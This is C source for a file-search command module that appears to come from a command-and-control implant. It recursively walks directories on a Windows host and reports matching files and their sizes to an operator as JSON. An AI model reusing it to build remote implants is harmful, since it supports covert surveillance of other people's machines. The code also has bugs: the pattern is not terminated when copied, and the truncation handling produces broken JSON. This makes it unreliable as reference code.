#include "config.h"
#ifdef INCLUDE_CMD_FIND

#include "commands.h"
#include "json_out.h"

static char g_search_dir[256];
static char g_pattern[128];
static JSON_BUF g_jb;
static DWORD g_found_count;
static BOOL  g_first;
static DWORD g_depth;
static char  g_base[256];

static void _lower(char* dst, const char* src) {
    int i = 0;
    for (; src[i] && i < 255; i++) dst[i] = (src[i] >= 'A' && src[i] <= 'Z') ? src[i] + 32 : src[i];
    dst[i] = 0;
}

// case-insensitive glob match (* and ?)
static BOOL _wildcard_match(const char* str, const char* pat) {
    char ls[256], lp[128];
    _lower(ls, str); _lower(lp, pat);
    int si = 0, pi = 0, star = -1, match = 0;
    while (ls[si]) {
        if (lp[pi] == ls[si]) { si++; pi++; }
        else if (lp[pi] == '*') { star = pi++; match = si; }
        else if (star >= 0) { pi = star + 1; si = ++match; }
        else return FALSE;
    }
    while (lp[pi] == '*') pi++;
    return lp[pi] == 0;
}


static void _walk(PINSTANCE inst, const char* dir, DWORD depth) {
    if (depth > 10) return;
    char search[512];
    int p = 0;
    for (; dir[p] && p < 255; p++) search[p] = dir[p];
    if (p > 0 && search[p-1] != '\\') search[p++] = '\\';
    search[p++] = '*'; search[p] = 0;

    WIN32_FIND_DATAA fd;
    HANDLE h = inst->Win32.FindFirstFileA(search, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.cFileName[0] == '.' && (fd.cFileName[1] == 0 || fd.cFileName[1] == '.')) continue;
        char full[512];
        int fp = 0;
        for (; dir[fp] && fp < 255; fp++) full[fp] = dir[fp];
        if (fp > 0 && full[fp-1] != '\\') full[fp++] = '\\';
        for (int i = 0; fd.cFileName[i] && fp < 510; i++) full[fp++] = fd.cFileName[i];
        full[fp] = 0;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            _walk(inst, full, depth + 1);
        } else {
            ULONGLONG sz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            char lname[256];
            _lower(lname, fd.cFileName);
            char lpat[128];
            _lower(lpat, g_pattern);
            // match
            BOOL matched = FALSE;
            if (lpat[0] == '*' && lpat[1] == '.') {
                // *.ext
                int el = 0; while (lpat[el]) el++;
                int ll = 0; while (lname[ll]) ll++;
                if (ll >= el) {
                    BOOL m = TRUE;
                    for (int e = 0; e < el; e++) if (lname[ll - el + e] != lpat[e]) { m = FALSE; break; }
                    matched = m;
                }
            } else {
                matched = _wildcard_match(lname, lpat);
            }
            if (!matched) continue;
            if (g_found_count) j_append_raw(&g_jb, ",");
            j_append_raw(&g_jb, "{\"path\":");
            j_append_str(&g_jb, full);
            j_append_raw(&g_jb, ",\"size\":");
            j_append_u64(&g_jb, sz);
            j_append_raw(&g_jb, "}");
            g_found_count++;
        }
    } while (inst->Win32.FindNextFileA(h, &fd));
    inst->Win32.FindClose(h);
}

VOID cmd_find(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD dir_len = 0, pat_len = 0;
    char* dir = parser_string(args, &dir_len);
    char* pattern = parser_string(args, &pat_len);
    if (!dir || dir_len == 0) {
        package_add_string(inst, response, XSTR("No directory specified"));
        response->is_error = TRUE;
        return;
    }
    int dp = 0;
    for (; dir[dp] && dp < 255; dp++) g_search_dir[dp] = dir[dp];
    g_search_dir[dp] = 0;
    int pp = 0;
    if (pattern && pat_len > 0)
        for (; pattern[pp] && pp < 127; pp++) g_pattern[pp] = pattern[pp];
    if (!g_pattern[0]) { g_pattern[0] = '*'; g_pattern[1] = 0; }

    j_init(&g_jb);
    g_jb.len = 0;
    g_jb.buf[0] = 0;
    j_append_raw(&g_jb, "{\"results\":[");
    g_found_count = 0;
    g_first = TRUE;
    _walk(inst, g_search_dir, 0);
    j_append_raw(&g_jb, "],\"count\":");
    j_append_uint(&g_jb, g_found_count);
    j_append_raw(&g_jb, "}");
    if (g_jb.truncated) {
        // truncate safely at the last complete entry
        int last = g_jb.len - 1;
        while (last > 0 && g_jb.buf[last] != '}') last--;
        g_jb.buf[last+1] = ']'; g_jb.buf[last+2] = '}'; g_jb.buf[last+3] = 0;
        j_append_raw(&g_jb, "\"_truncated\":true}");
    }
    package_add_bytes(inst, response, (BYTE*)g_jb.buf, g_jb.len);
}

#endif
